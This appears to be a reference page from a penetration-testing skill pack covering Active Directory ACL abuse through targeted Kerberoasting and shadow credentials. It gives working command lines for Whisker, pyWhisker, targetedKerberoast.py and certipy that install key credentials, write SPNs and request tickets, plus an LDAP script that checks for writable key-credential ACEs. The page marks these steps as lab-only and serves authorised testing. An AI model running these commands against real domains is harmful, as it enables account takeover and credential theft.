# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`active-directory-acl-targeted-kerberoast-shadow-credentials`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Whisker` | `Whisker.exe add /target:adm_target /domain:corp.example /dc:dc01` | Install a key credential, authorised lab only | Windows |
| `pyWhisker` | `pywhisker.py -d corp.example -u lowpriv -p pass --target adm_target --action add` | Same from Linux, lab only | Linux |
| `targetedKerberoast.py` | `targetedKerberoast.py -d corp.example -u lowpriv -p pass --request` | Write an SPN and request a ticket, lab only | Linux |
| `Get-ADUser` | `Get-ADUser adm_target -Properties msDS-KeyCredentialLink,servicePrincipalName` | Current attribute state | Windows |
| `certipy` | `certipy auth -pfx adm_target.pfx -dc-ip 10.20.30.10` | PKINIT authentication with the installed key, lab only | Linux / Windows |

## Minimal Lab Validation Script

Report the write ACE and the current attribute state; installing a key or an SPN is a state change that needs its own authorisation and restoration step.

```python
from ldap3 import Server, Connection, NTLM
from ldap3.protocol.microsoft import security_descriptor_control

KEYCRED_GUID = "5b47d60f-6090-40b2-9f37-2a4de88f3063"
srv = Server("10.20.30.10")
conn = Connection(srv, user="CORP\\lowpriv", password="pass", authentication=NTLM, auto_bind=True)
conn.search("DC=corp,DC=example", "(sAMAccountName=adm_target)",
            attributes=["nTSecurityDescriptor", "msDS-KeyCredentialLink",
                        "servicePrincipalName"],
            controls=security_descriptor_control(sdflags=0x04))
for e in conn.entries:
    print("existing_keys", e.msDS_KeyCredentialLink.value)
    print("existing_spns", e.servicePrincipalName.value)
    sd = e.nTSecurityDescriptor.value
    for ace in (sd["dacl"].aces if sd else []):
        ot = str(ace.get("object_type") or "")
        if KEYCRED_GUID in ot.lower():
            print("keycred_ace", ace.get("ace_type"), ace.get("trustee"),
                  hex(int(ace["access_mask"])))
```

## Flag Notes

- `--request` performs the ticket request after writing the SPN; omit it to only assess writability.
- `--action add` writes a key; `--action list` is the read-only form and should be used first.
- `-pfx` performs PKINIT with a certificate, which is how the installed key is proven usable.
